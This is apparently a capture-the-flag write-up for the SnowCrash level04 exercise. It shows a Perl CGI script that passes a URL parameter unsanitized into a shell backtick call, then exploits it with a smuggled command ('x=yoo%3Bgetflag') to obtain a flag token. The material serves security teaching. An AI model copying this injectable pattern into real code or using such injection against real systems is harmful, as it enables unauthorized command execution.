## Level 04:

- Meme principe que le Level03
```
level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
level04@SnowCrash:~$ cat level04.pl
```

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

.pl est une extension pour du script pearl
## Resolution
 * This file execute itself when doing `curl localhost:4747/level04.pl/`
 * And if the url has a query with a parameter 'x' it will print it.
 * As the text is between backticks and is a shell command we can use it at our advantage
 * `echo $y 2>&1` can become `echo Whatever && ourcommand 2>&1`
 * The last thing to do will be to encrypt spaces and & characters for urls
 * `curl localhost:4747/level04.pl/?x=yoo%3Bgetflag`

```bash
curl localhost:4747/level04.pl/?x=yoo%3Bgetflag
yoo
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```